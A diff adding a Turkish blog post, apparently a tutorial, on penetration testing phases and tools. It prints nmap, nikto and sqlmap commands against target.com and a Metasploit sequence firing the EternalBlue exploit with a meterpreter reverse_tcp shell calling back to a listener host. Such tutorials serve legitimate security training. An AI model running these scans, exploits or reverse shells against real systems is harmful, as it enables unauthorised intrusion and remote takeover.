@@ -1,0 +1,58 @@
+---
+publishDate: 2024-06-15T00:00:00Z
+title: Penetrasyon Testi Metodolojileri ve En İyi Uygulamalar
+excerpt: Profesyonel penetrasyon testlerinin nasıl planlanacağı, yürütüleceği ve raporlanacağına dair kapsamlı rehber.
+image: https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.1.0
+category: Siber Güvenlik
+tags:
+  - penetrasyon testi
+  - etik hackleme
+  - güvenlik testleri
+  - OWASP
+metadata:
+  canonical: https://bgs.io/penetrasyon-testi-rehberi
+---
+
+import DListItem from '~/components/ui/DListItem.astro';
+
+## Penetrasyon Testinin Temel Aşamaları
+
+<DListItem dt="Planlama ve Kapsam Belirleme">
+  Test edilecek sistemler, kullanılacak yöntemler ve yasal çerçeve detaylandırılır.
+</DListItem>
+
+<DListItem dt="Keşif ve Bilgi Toplama">
+  Pasif ve aktif keşif teknikleri ile hedef sistem hakkında bilgi edinilir.
+</DListItem>
+
+<DListItem dt="Zafiyet Analizi">
+  Sistemdeki güvenlik açıkları tespit edilir ve önceliklendirilir.
+</DListItem>
+
+<DListItem dt="Sızma ve Sömürü">
+  Tespit edilen zafiyetler kontrollü şekilde sömürülür.
+</DListItem>
+
+## Penetrasyon Testi Araçları
+
+```bash
+# Nmap ile Port Tarama
+nmap -sS -sV -O target.com
+
+# Nikto ile Web Zafiyet Tarama
+nikto -h http://target.com
+
+# Sqlmap ile SQL Injection Testi
+sqlmap -u "http://target.com/page?id=1" --dbs
+```
+
+### Metasploit Framework Kullanımı
+
+```ruby
+# Metasploit Console
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit
+```
